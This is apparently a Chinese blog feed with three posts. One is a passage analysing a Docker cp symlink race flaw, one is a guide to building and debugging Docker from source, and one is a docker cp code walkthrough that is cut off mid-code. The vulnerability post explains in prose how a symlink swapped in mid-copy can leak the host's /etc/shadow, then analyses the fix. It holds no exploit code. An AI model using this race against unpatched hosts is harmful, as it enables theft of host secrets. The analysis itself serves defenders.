class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">copyFromContainer</span><span class="hljs-params">(ctx context.Context, dockerCli *command.DockerCli, srcContainer, srcPath, dstPath <span class="hljs-type">string</span>, cpParam *cpConfig)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">if</span> cpParam.followLink &#123;<br>srcStat, err := statContainerPath(ctx, dockerCli, srcContainer, srcPath)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; srcStat.Mode&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>linkTarget := srcStat.LinkTarget<br><span class="hljs-keyword">if</span> !system.IsAbs(linkTarget) &#123;<br>srcParent, _ := archive.SplitPathDirEntry(srcPath)<br>linkTarget = filepath.Join(srcParent, linkTarget)<br>&#125;<br><br>linkTarget, rebaseName = archive.GetRebaseName(srcPath, linkTarget)<br>srcPath = linkTarget<br>&#125;<br><br>&#125;<br><br>content, stat, err := dockerCli.Client().CopyFromContainer(ctx, srcContainer, srcPath)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 statContainerPath函数会将文件路径信息和容器信息发送到daemon的“head &#x2F;container&#x2F;(containerID)&#x2F;archive”接口。CopyFromContainer函数会将文件路径信息和容器信息发送到daemon的“get &#x2F;container&#x2F;(containerID)&#x2F;archive”接口</p><h3 id="Head-container-containerID-archive-：文件路径转换"><a href="#Head-container-containerID-archive-：文件路径转换" class="headerlink" title="Head &#x2F;container&#x2F;(containerID)&#x2F;archive ：文件路径转换"></a>Head &#x2F;container&#x2F;(containerID)&#x2F;archive ：文件路径转换</h3><p> 该接口daemon主要负责将path信息进行安全转换，daemon的处理逻辑如下(&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;copy.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> headContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>stat, err := s.backend.ContainerStatPath(v.Name, v.Path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">return</span> setContainerPathStatHeader(stat, w.Header())<br>&#125;<br></code></pre></td></tr></table></figure><p>ContainerStatPath函数经过一系列函数调用后会调用到FollowSymlinkInScope函数(&#x2F;pkg&#x2F;symlink&#x2F;fs.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FollowSymlinkInScope</span><span class="hljs-params">(path, root <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>path, err := filepath.Abs(filepath.FromSlash(path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br>root, err = filepath.Abs(filepath.FromSlash(root))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> evalSymlinksInScope(path, root)<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数将路径进行一个安全的转换，将在作用域 <code>root</code> 中评估 <code>path</code> 中的符号链接，并返回在调用时保证包含在 <code>root</code> 范围内的结果。<br>例如： &#x2F;foo&#x2F;bar -&gt; &#x2F;outside<br>FollowSymlinkInScope(“&#x2F;foo&#x2F;bar”, “&#x2F;foo”) &#x3D;&#x3D; “&#x2F;foo&#x2F;outside”，而不是”&#x2F;outside”<br>经过FollowSymLinkInScope函数转换后的路径将会被返回给docker client。</p><h3 id="Get-container-containerID-archive：文件打包"><a href="#Get-container-containerID-archive：文件打包" class="headerlink" title="Get &#x2F;container&#x2F;(containerID)&#x2F;archive：文件打包"></a>Get &#x2F;container&#x2F;(containerID)&#x2F;archive：文件打包</h3><p>docker client接收到daemon安全转换后的路径后并没有立即使用该路径，而是经过一些处理后使用CopyFromContainer函数发送给daemon的“get &#x2F;container&#x2F;(containerID)&#x2F;archive”接口。这个间隙就是该漏洞产生的原因。<br>daemon接受到该接口传来的信息后会根据路径信息和容器信息进行文件的打包工作，并将打包好的文件通过response返回给docker client。daemon的处理逻辑如下(&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;copy.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> getContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>tarArchive, stat, err := s.backend.ContainerArchivePath(v.Name, v.Path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> tarArchive.Close()<br><br><span class="hljs-keyword">if</span> err := setContainerPathStatHeader(stat, w.Header()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>w.Header().Set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-tar&quot;</span>)<br><span class="hljs-keyword">return</span> writeCompressedResponse(w, r, tarArchive)<br>&#125;<br></code></pre></td></tr></table></figure><p>s.backend.ContainerArchivePath函数会经过一系列函数调用后调用到TarWithOptions函数(&#x2F;pkg&#x2F;archive&#x2F;archive.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TarWithOptions</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *TarOptions)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>tb, err := NewTarballer(srcPath, options)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">go</span> tb.Do()<br><span class="hljs-keyword">return</span> tb.Reader(), <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该函数首先创建了一个新的Tarballer对象并调用该对象的Do函数进行文件打包。Do函数又会调用到addTarFile函数(&#x2F;pkg&#x2F;archive&#x2F;archive.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ta *tarAppender)</span></span> addTarFile(path, name <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">if</span> fi.Mode()&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>link, err = os.Readlink(path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>在addTarFile函数中会首先判断路径下文件的软链接信息，如果有软链接就将软链接指向的文件打包进最终的文件中。但是此步骤是在宿主机路径下进行解析的，所以如果攻击者在FollowSymlinkInScope转换后，addTarFile使用前对目标文件添加一个恶意的软链接，如“&#x2F;etc&#x2F;shadow”，那addTarFile进行软链接解析的时候会将宿主机的&#x2F;etc&#x2F;shadow打包进最终的文件中返回给docker client。</p><h2 id="修复代码分析"><a href="#修复代码分析" class="headerlink" title="修复代码分析"></a>修复代码分析</h2><h3 id="暂时性修复措施"><a href="#暂时性修复措施" class="headerlink" title="暂时性修复措施"></a>暂时性修复措施</h3><p>官方建议用户在使用docker cp命令前执行docker pause命令，并在结束cp命令后执行docker unpause。pause和unpause命令被自动加入到cp命令的运行过程中，通过冻结容器的方式阻断copy过程中对容器文件数据的篡改。</p><h3 id="根本性修复措施"><a href="#根本性修复措施" class="headerlink" title="根本性修复措施"></a>根本性修复措施</h3><p>（git commit id : 364f9bce16e8c95c79fc68d23867e871f20cb452）<br>官方代码修复链接：<a href="https://github.com/moby/moby/pull/39292">https://github.com/moby/moby/pull/39292</a><br>漏洞的提出者指出该漏洞的根本修复方法在于修改chrootarchive中的归档逻辑，因此官方修复后的代码主要是对Do函数进行了限制，让其在容器的文件系统下进行打包而不是宿主机的文件系统下。(&#x2F;pkg&#x2F;chrootarchive&#x2F;archive_unix.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">invokePack</span><span class="hljs-params">(srcPath <span class="hljs-type">string</span>, options *archive.TarOptions, root <span class="hljs-type">string</span>)</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>...<br>err = goInChroot(root, tb.Do)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>goInChroot函数将tb.Do的执行范围限制在了<code>root</code>范围下，即容器的目录下。(&#x2F;pkg&#x2F;chrootarchive&#x2F;chroot_linux.go)</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">goInChroot</span><span class="hljs-params">(path <span class="hljs-type">string</span>, fn <span class="hljs-keyword">func</span>()</span></span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> unshare.Go(<br>unix.CLONE_FS|unix.CLONE_NEWNS,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := mount.MakeRSlave(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> mounttree.SwitchRoot(path)<br>&#125;,<br>fn,<br>)<br>&#125;<br></code></pre></td></tr></table></figure><p>goInChroot函数调用了unshare.Go函数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Go</span><span class="hljs-params">(flags <span class="hljs-type">int</span>, setupfn <span class="hljs-keyword">func</span>()</span></span> <span class="hljs-type">error</span>, fn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>) <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>...<br><span class="hljs-keyword">if</span> err := unix.Unshare(flags); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- os.NewSyscallError(<span class="hljs-string">&quot;unshare&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> setupfn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := setupfn(); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- err<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">close</span>(started)<br><br><span class="hljs-keyword">if</span> fn != <span class="hljs-literal">nil</span> &#123;<br>fn()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">return</span> &lt;-started<br>&#125;<br></code></pre></td></tr></table></figure><p>将goInChroot和unshare.Go函数结合起来看，我们可以发现修复后做限制的逻辑是：</p><ul><li>开启一个goroutine进行文件打包操作</li><li>对开启的这个goroutine使用unshare系统调用赋予其新的Mount命名空间，并且与父进程共享一套文件系统（在后续的版本中使用reexec代替了此部操作）</li><li>使用mounttree.SwitchRoot(path)进行chroot</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker源码阅读，开发，调试环境搭建</title>
    <link href="/cllafrcok0006foutesrc09r4/"/>
    <url>/cllafrcok0006foutesrc09r4/</url>
    
    <content type="html"><![CDATA[<h1 id="docker源码阅读，开发，调试环境搭建"><a href="#docker源码阅读，开发，调试环境搭建" class="headerlink" title="docker源码阅读，开发，调试环境搭建"></a>docker源码阅读，开发，调试环境搭建</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>docker分为两部分，docker client 和docker engine。docker client就是我们日常使用的docker命令行工具，用户通过docker client指定参数向docker engine发送信息，docker engine接受到信息后做出实际的操作。目前这两部分的代码已经分离，其中docker client代码位于<a href="https://github.com/docker/cli,docker">https://github.com/docker/cli,docker</a> engine(更名为moby)代码位于<a href="https://github.com/moby/moby%E3%80%82%E7%94%B1%E4%BA%8E%E5%9C%A8%E7%BC%96%E8%AF%91%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8%E5%88%B0docker%E5%92%8Cgo%EF%BC%8C%E6%89%80%E4%BB%A5%E9%9C%80%E8%A6%81%E9%A2%84%E5%85%88%E8%A3%85%E5%A5%BDdocker%E5%92%8Cgo">https://github.com/moby/moby。由于在编译时会使用到docker和go，所以需要预先装好docker和go</a></p><h2 id="docker-client"><a href="#docker-client" class="headerlink" title="docker client"></a>docker client</h2><p>首先下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/docker/cli.git<br></code></pre></td></tr></table></figure><p>之后将下载好的源码放到$GOPATH&#x2F;src&#x2F;github.com&#x2F;docker下<br><img src="/.com//bVc8ZNO" alt="截屏2023-07-26 15.22.09.png"><br>进入到cli目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make -f docker.Makefile binary<br></code></pre></td></tr></table></figure><p>顺利执行完毕后会在当前目录下的build下发现编译好的docker，此时docker client编译完成。当我们想要做出更改的时候，修改完代码再执行一次上面的make命令即可重新编译成功。<br>需要注意的是，如果我们想用dlv或者gdb对编译好的可执行文件进行调试就需要再编译时保留调试信息，但是默认情况下编译出来的可执行文件是不包含调试信息的，我们需要在&#x2F;scripts&#x2F;build&#x2F;.variables下将GO_LDFLAGS的”-w”删除掉。<br><img src="/.com//bVc8ZPn" alt="截屏2023-07-26 15.34.17.png"></p><h2 id="moby"><a href="#moby" class="headerlink" title="moby"></a>moby</h2><p>同样，首先下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/moby/moby.git<br></code></pre></td></tr></table></figure><p>之后将下载好的源码放到$GOPATH&#x2F;src&#x2F;github.com&#x2F;docker下，并将其重命名为docker<br><img src="/.com//bVc8ZNO" alt="截屏2023-07-26 15.22.09.png"><br>进入到docker目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">make binary   （静态编译）<br>make dynbinary (动态编译)<br></code></pre></td></tr></table></figure><p>顺利执行完毕后会在当前目录下的bundles&#x2F;binary下发现dockerd可执行文件（如果是动态编译的话可执行文件会存放在bundles&#x2F;dynbinary下）<br>同样，如果我们想要使用dlv或者gdb等对dockerd进行调试，那我们就需要保留调试信息。在hack&#x2F;make.sh中将LDFLAGS的“-w”去掉<br><img src="/.com//bVc8ZPf" alt="截屏2023-07-26 15.33.55.png"></p><h2 id="联动"><a href="#联动" class="headerlink" title="联动"></a>联动</h2><p>至此docker client和moby的编译工作已经完成，下一步是需要让编译好的docker client使用编译好的moby作为docker daemon。此时我们需要先将原有的docker停止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl stop docker<br>systemctl stop docker.socket<br></code></pre></td></tr></table></figure><p>之后先进入GOPATH&#x2F;src&#x2F;github.com&#x2F;docker&#x2F;docker&#x2F;bundles&#x2F;binary下启动dockerd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./dockerd<br></code></pre></td></tr></table></figure><p>此时使用$GOPATH&#x2F;src&#x2F;github.com&#x2F;docker&#x2F;cli&#x2F;build下的docker client时，它会自动将请求发送到自行编译的moby上。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker cp源码分析</title>
    <link href="/cllafrcol0007foutdae294au/"/>
    <url>/cllafrcol0007foutdae294au/</url>
    
    <content type="html"><![CDATA[<h1 id="docker-cp源码分析"><a href="#docker-cp源码分析" class="headerlink" title="docker cp源码分析"></a>docker cp源码分析</h1><p>最近在分析docker的几个cve的时候发现好多都与docker cp命令有关，故此从代码层面分析一下docker cp的实现流程</p><h2 id="docker-cp简介"><a href="#docker-cp简介" class="headerlink" title="docker cp简介"></a>docker cp简介</h2><p>docker cp命令用于宿主机和容器之间的文件传输。数据流向有两种，从容器到宿主机和从宿主机到容器，目前不支持从容器到容器的复制。命令格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker cp hostfile containerID:containerFile #从宿主机向容器复制文件<br>docker cp containerID:containerFile hostFile #从容器向宿主机复制文件<br></code></pre></td></tr></table></figure><h2 id="docker-client源码分析"><a href="#docker-client源码分析" class="headerlink" title="docker client源码分析"></a>docker client源码分析</h2><p>当用户执行docker cp命令后会首先进入runCopy函数（&#x2F;cli&#x2F;command&#x2F;container&#x2F;cp.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runCopy</span><span class="hljs-params">(dockerCli command.Cli, opts copyOptions)</span></span> <span class="hljs-type">error</span> &#123;<br>srcContainer, srcPath := splitCpArg(opts.source)<br>destContainer, destPath := splitCpArg(opts.destination)<br>...<br><span class="hljs-keyword">var</span> direction copyDirection<br><span class="hljs-keyword">if</span> srcContainer != <span class="hljs-string">&quot;&quot;</span> &#123;<br>direction |= fromContainer<br>copyConfig.container = srcContainer<br>&#125;<br><span class="hljs-keyword">if</span> destContainer != <span class="hljs-string">&quot;&quot;</span> &#123;<br>direction |= toContainer<br>copyConfig.container = destContainer<br>&#125;<br>    ...<br><span class="hljs-keyword">switch</span> direction &#123;<br><span class="hljs-keyword">case</span> fromContainer:<br><span class="hljs-keyword">return</span> copyFromContainer(ctx, dockerCli, copyConfig)<br><span class="hljs-keyword">case</span> toContainer:<br><span class="hljs-keyword">return</span> copyToContainer(ctx, dockerCli, copyConfig)<br><span class="hljs-keyword">case</span> acrossContainers:<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;copying between containers is not supported&quot;</span>)<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;must specify at least one container source&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>runCopy函数首先对用户输入的参数进行解析，判断是从宿主机向容器复制文件还是从容器向宿主机复制文件。根据文件流向的不同调用不同的函数。</p><h3 id="copyFromContainer"><a href="#copyFromContainer" class="headerlink" title="copyFromContainer"></a>copyFromContainer</h3><p>当用户执行docker cp containerid:containerFile hostFile命令时会进入copyFromContainer函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">copyFromContainer</span><span class="hljs-params">(ctx context.Context, dockerCli command.Cli, copyConfig cpConfig)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br>client := dockerCli.Client()<br><span class="hljs-comment">// if client requests to follow symbol link, then must decide target file to be copied</span><br><span class="hljs-keyword">var</span> rebaseName <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> copyConfig.followLink &#123;<br>srcStat, err := client.ContainerStatPath(ctx, copyConfig.container, srcPath)<br><br><span class="hljs-comment">// If the destination is a symbolic link, we should follow it.</span><br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; srcStat.Mode&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>linkTarget := srcStat.LinkTarget<br><span class="hljs-keyword">if</span> !system.IsAbs(linkTarget) &#123;<br><span class="hljs-comment">// Join with the parent directory.</span><br>srcParent, _ := archive.SplitPathDirEntry(srcPath)<br>linkTarget = filepath.Join(srcParent, linkTarget)<br>&#125;<br><br>linkTarget, rebaseName = archive.GetRebaseName(srcPath, linkTarget)<br>srcPath = linkTarget<br>&#125;<br><br>&#125;<br>    ...<br>content, stat, err := client.CopyFromContainer(ctx, copyConfig.container, srcPath)<br>...<br>preArchive := content<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(srcInfo.RebaseName) != <span class="hljs-number">0</span> &#123;<br>_, srcBase := archive.SplitPathDirEntry(srcInfo.Path)<br>preArchive = archive.RebaseArchiveEntries(content, srcBase, srcInfo.RebaseName)<br>&#125;<br>...<br>res := archive.CopyTo(preArchive, srcInfo, dstPath)<br>...<br><span class="hljs-keyword">return</span> res<br>&#125;<br></code></pre></td></tr></table></figure><p>如果设置了followLink，copyFromContainer函数会先调用client.ContainerStatPath函数向docker daemon的<code>HEAD /containers/(containerID)/archive</code>接口发送文件路径信息和容器信息来获得srcPath的链接target，并将srcPath(也就时容器中的文件位置)设置为链接的目标文件,同时设置rebasename表示源文件路径需要调整。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cli *Client)</span></span> ContainerStatPath(ctx context.Context, containerID, path <span class="hljs-type">string</span>) (types.ContainerPathStat, <span class="hljs-type">error</span>) &#123;<br>    ...<br>urlStr := <span class="hljs-string">&quot;/containers/&quot;</span> + containerID + <span class="hljs-string">&quot;/archive&quot;</span><br>response, err := cli.head(ctx, urlStr, query, <span class="hljs-literal">nil</span>)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>之后调用client.CopyFromContainer函数将srcPath以及container的信息发送给docker daemon的<code>GET /containers/(containerID)/archive</code>接口。docker daemon的该接口会根据path和container信息将需要复制的文件进行打包，并以response的形式返回给docker client</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cli *Client)</span></span> CopyFromContainer(ctx context.Context, containerID, srcPath <span class="hljs-type">string</span>) (io.ReadCloser, types.ContainerPathStat, <span class="hljs-type">error</span>) &#123;<br>...<br>apiPath := <span class="hljs-string">&quot;/containers/&quot;</span> + containerID + <span class="hljs-string">&quot;/archive&quot;</span><br>response, err := cli.get(ctx, apiPath, query, <span class="hljs-literal">nil</span>)<br>...<br><span class="hljs-keyword">return</span> response.body, stat, err<br>&#125;<br></code></pre></td></tr></table></figure><p>接收到response中的文件信息后docker client会使用CopyTo函数将response中的文件移动到dstpath位置。在此之前，如果源文件的路径需要重新调整（rebaseName 不为空），则使用 archive.RebaseArchiveEntries 函数调整文件内容中的条目路径。<br>总体而言 copyFromContainer的执行流程大致如下图所示，其中红色标识的函数为client向daemon发送请求，其实际的执行逻辑由daemon进行：<br><img src="/.com//bVc80SK"></p><h3 id="copyToContainer"><a href="#copyToContainer" class="headerlink" title="copyToContainer"></a>copyToContainer</h3><p>当用户执行docker cp hostFile containerid:containerFile 命令时会进入copyToContainer函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">copyToContainer</span><span class="hljs-params">(ctx context.Context, dockerCli command.Cli, copyConfig cpConfig)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br>client := dockerCli.Client()<br> ...<br>dstStat, err := client.ContainerStatPath(ctx, copyConfig.container, dstPath)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; dstStat.Mode&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>linkTarget := dstStat.LinkTarget<br><span class="hljs-keyword">if</span> !system.IsAbs(linkTarget) 